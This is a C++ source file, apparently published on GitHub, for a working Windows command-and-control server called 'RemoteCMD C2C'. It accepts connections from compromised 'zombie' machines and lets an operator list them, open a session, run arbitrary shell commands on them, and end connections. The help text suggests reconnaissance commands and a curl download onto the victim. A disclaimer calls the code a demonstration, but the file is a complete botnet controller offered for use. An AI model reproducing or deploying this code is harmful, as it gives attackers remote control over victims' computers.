/*
Coded by Stressedd, published to GitHub.
Please, dont skid the code or try to use it for malicious purposes.
This is just a demonstration of a common attack used by malware devs.
*/

#include <winsock2.h>
#include <Ws2tcpip.h>
#include <windows.h>
#include <string>
#include <iostream>
#include <thread>
#include <locale>
#include <vector>

#pragma comment(lib,"ws2_32.lib")

static int PORT = 6666;

class Session {
public:
	typedef void(*mReceivedPacket)(Session* source, std::string data);
	typedef void(*mDisconnected)(Session* source);

	static DWORD WINAPI StartRecieveThread(LPVOID lpParam) {
		if (!lpParam) return 0;
		Session* session = (Session*)lpParam;
		session->TaskReceive();
		return 1;
	}

	std::string ip;
	SOCKET sock;
	bool connected = true;
	mReceivedPacket recvListener;
	mDisconnected disconnectedListener;
	bool firstTime = true;

	Session(SOCKET sockParam, std::string ipParam, mReceivedPacket recvListenerParam, mDisconnected disconnectedListenerParam)
		: sock(sockParam), ip(ipParam), recvListener(recvListenerParam), disconnectedListener(disconnectedListenerParam) {
		DWORD dwThreadReceiveID;
		CreateThread(NULL, 0, StartRecieveThread, this, 0, &dwThreadReceiveID);
	}

	void TaskReceive() {
		while (connected) {
			int bufferLength = 4096;
			char buffer[4096];
			int iResult;

			iResult = recv(sock, buffer, bufferLength, 0);

			if (iResult > 0) {
				std::string req = std::string(buffer, buffer + iResult);
				recvListener(this, req);
			}
			else {
				closesocket(sock);
				connected = false;
				disconnectedListener(this);
			}

			Sleep(1);
		}
	}

};

SOCKET serverSocket;
std::vector<Session*> sessions;
Session* active;

std::string NormalizedIPString(SOCKADDR_IN addr, bool withPort = false) {
	char host[16];
	ZeroMemory(host, 16);
	inet_ntop(AF_INET, &addr.sin_addr, host, 16);

	USHORT port = ntohs(addr.sin_port);

	int realLen = 0;
	for (int i = 0; i < 16; i++) {
		if (host[i] == '\00') {
			break;
		}
		realLen++;
	}

	std::string res(host, realLen);
	if (withPort)res += ":" + std::to_string(port);

	return res;
}

void commands() {
	while (true) {
		std::string respond;
		getline(std::cin, respond);

		
			if (active != nullptr) {
				if (respond == "leave") {
					std::string cmd = "1stop";
					send(active->sock, cmd.c_str(), cmd.length(), 0);
					std::cout << "ABORTED " << active->ip << std::endl;
					std::cout << "RemoteCMD C2C >> ";
					active = nullptr;
				}
				else {
					respond = '0' + respond + '\n';
					send(active->sock, respond.c_str(), respond.length(), 0);
				}
			}
			else {
				if (respond == "zombies") {
					std::cout << std::endl << "ZOMBIES" << std::endl;
					std::cout << std::endl << "----------" << std::endl;
					for (int i = 0; i < sessions.size(); i++) {
						std::cout << "Number: "<< i << ": " << sessions[i]->ip << std::endl;
					}
					std::cout << std::endl;
					std::cout << "RemoteCMD C2C >> ";
				}

				else if (respond == "help") {
					std::cout << std::endl << "----------------------------------" << std::endl;
					std::cout << std::endl << "Type in zombies to view your connections, type in select + the number for the client to connect to cmd." << std::endl;
					std::cout << std::endl << "If in session, type in leave to leave the session, then if you want to kill the connection, type in kill." << std::endl;
					std::cout << std::endl << "You can also type in useful to view useful cmd commands." << std::endl;
					std::cout << std::endl << "----------------------------------" << std::endl;
					std::cout << std::endl;
					std::cout << "RemoteCMD C2C >> ";
				}

				else if (respond == "useful") {
					std::cout << std::endl << "----------------------------------" << std::endl;
					std::cout << std::endl << "echo some-text  > filename.txt - Creating a sample txt file." << std::endl;
					std::cout << std::endl << "whoami - Prints the Desktop + Account name." << std::endl;
					std::cout << std::endl << "curl http://example.org/picture.jpg -O picture.jpg  - Downloads a file from a url." << std::endl;
					std::cout << std::endl << "tasklist - Shows running processes." << std::endl;
					std::cout << std::endl << "You can use Google for any cmd command, these were just examples." << std::endl;
					std::cout << std::endl << "----------------------------------" << std::endl;

					std::cout << std::endl;
					std::cout << "RemoteCMD C2C >> ";
				}

				else if (respond.substr(0, 7) == "select ") {
					int currSession = stoi(respond.substr(7));
					std::string cmd = "1start";

					std::cout << "SESSION STARTED " << sessions[currSession]->ip << std::endl;
					std::cout << std::endl << "----------" << std::endl;
					

					active = sessions[currSession];
					send(active->sock, cmd.c_str(), cmd.length(), 0);

					if (!active->firstTime) {
						cmd = "0\n";
						send(active->sock, cmd.c_str(), cmd.length(), 0);
					}

					active->firstTime = false;
				}
				else if (respond.substr(0, 5) == "kill ") {
					int currSession = stoi(respond.substr(5));
					std::string cmd = "1kill";

					send(sessions[currSession]->sock, cmd.c_str(), cmd.length(), 0);
				}
				else {
					std::cout << "UNKNOWN COMMAND: " << respond << std::endl;
					std::cout << "RemoteCMD C2C >> ";
				}
			}

		Sleep(1);
	}
}

void ReceivedPacket(Session* source, std::string data) {
	if (source == active) {
		std::cout << data;
	}
}

void Disconnected(Session* source) {
	if (source == active) {
		std::cout << std::endl << "SESSION ABORTED " << active->ip << std::endl;
		active = nullptr;
	}
	for (int i = 0; i < sessions.size(); i++) {
		if (sessions[i] == source) {
			sessions.erase(sessions.begin() + i);
			break;
		}
	}
	std::cout << std::endl << "ZOMBIE DISCONNECTED " << source->ip << std::endl;
	std::cout << "RemoteCMD C2C >> ";
}

int main() {

SetConsoleTitleA("RemoteCMD");

	std::cout << "Made by 0xStressedd on GitHub." << std::endl;
	std::cout << "Type in help to get started with commands." << std::endl;
	std::cout << "-----------------" << std::endl;
	std::cout << "           (    )" << std::endl;
	std::cout << "            (oo)" << std::endl;
	std::cout << "   )\.-----/(O O)" << std::endl;
	std::cout << "  # ;       / u" << std::endl;
	std::cout << "    (  .   |} )" << std::endl;
	std::cout << "     |/ `.;|/;" << std::endl;
	std::cout << "      -   -  -"<< std::endl;
	std::cout << "" << std::endl;
	std::cout << "She wanna fuck with the Moo - Pop Smoke" << std::endl;
	std::cout << "" << std::endl;


	std::cout << "RemoteCMD C2C >> ";

	WSADATA wsaData;
	if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
		return 0;
	}

	SOCKADDR_IN sockAddr;
	sockAddr.sin_port = htons(PORT);
	sockAddr.sin_family = AF_INET;
	sockAddr.sin_addr.s_addr = htonl(INADDR_ANY);

	serverSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);

	if (bind(serverSocket, (LPSOCKADDR)&sockAddr, sizeof(sockAddr)) == SOCKET_ERROR) {
		return 0;
	}

	listen(serverSocket, 1000);

	std::thread threadInput = std::thread(commands);

	while (true) {
		SOCKADDR_IN clientAddr;
		int clientSize = sizeof(clientAddr);
		SOCKET clientSocket = accept(serverSocket, (sockaddr*)&clientAddr, &clientSize);
		std::string ip = NormalizedIPString(clientAddr, false);
		std::cout << std::endl << "NEW ZOMBIE " << ip << " NUMBER: " << sessions.size() << std::endl << std::endl;
		std::cout << "RemoteCMD C2C >> ";

		Session* session = new Session(clientSocket, ip, &ReceivedPacket, &Disconnected);
		sessions.push_back(session);
	}

	closesocket(serverSocket);
	WSACleanup();
}